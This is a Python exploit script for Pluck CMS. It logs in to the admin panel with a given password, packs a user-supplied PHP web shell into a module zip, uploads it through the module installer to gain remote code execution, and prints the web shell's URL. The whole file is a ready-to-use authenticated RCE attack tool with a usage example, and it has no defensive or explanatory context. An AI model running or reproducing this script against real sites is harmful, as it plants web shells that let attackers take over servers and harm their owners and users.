import os, sys, shutil
import random, string
import argparse
import tempfile
import requests
import time


session = requests.Session()
EPILOG_TXT='''
Example : python exploit.py -u http://pluck.local -p 'anti_sysadmin' -f phpinfo.php
'''


def gen_string():
    """Generate a random none-repeating string"""
    return ''.join(random.choices(string.ascii_lowercase, k=8))


def login(base_url: str, password: str):
    print('[*] Logging in')
    url = f'{base_url}/login.php'
    response = session.get(url)
    data = {
        'cont1': password,
        'bogus': '',
        'submit': 'Login in',
    }
    response = session.post(url, data=data)
    if 'Password incorrect' in response.text:
        print('[-] Failed to login')
        sys.exit(1)
    return response.text


def upload_module(base_url: str, php_fp: str):
    print('[*] Uploading module')
    url = f'{base_url}/admin.php?action=installmodule'
    headers = {
        'Referer': f'{base_url}/admin.php?action=start',
    }
    headers.update(session.headers)
    zip_fp = tempfile.NamedTemporaryFile(suffix='.zip').name
    with tempfile.TemporaryDirectory() as tmp_dir:
        shutil.copy(php_fp, f'{tmp_dir}/x.php')
        shutil.make_archive(zip_fp[:-4], 'zip', tmp_dir)
    module_name = gen_string()
    files = {
        'sendfile': (f'{module_name}.zip', open(f'{zip_fp}', 'rb'), 'application/zip'),
        'submit': (None, 'Upload'),
    }
    response = session.post(url, files=files, headers=headers)
    os.remove(zip_fp)
    if 'The module has been installed successfully' not in response.text:
        print('[-] Failed to upload module')
        sys.exit(1)
    return f'{base_url}/data/modules/{module_name}/x.php'


def get_args():
    parser = argparse.ArgumentParser(description='Pluck CMS module install to RCE (Authenticated)', formatter_class=argparse.RawTextHelpFormatter, epilog=EPILOG_TXT)
    parser.add_argument('-u', '--url', help='Base URL', required=True)
    parser.add_argument('-p', '--password', help='Password', required=True)
    parser.add_argument('-f', '--webshell-fp', help='PHP web shell to upload', required=True)
    return parser.parse_args()


if __name__ == '__main__':
    args = get_args()
    base_url = args.url
    password = args.password
    php_fp = args.webshell_fp
    login(base_url, password)
    webshell_url = upload_module(base_url, php_fp)
    print(f'[+] Webshell uploaded to {webshell_url}')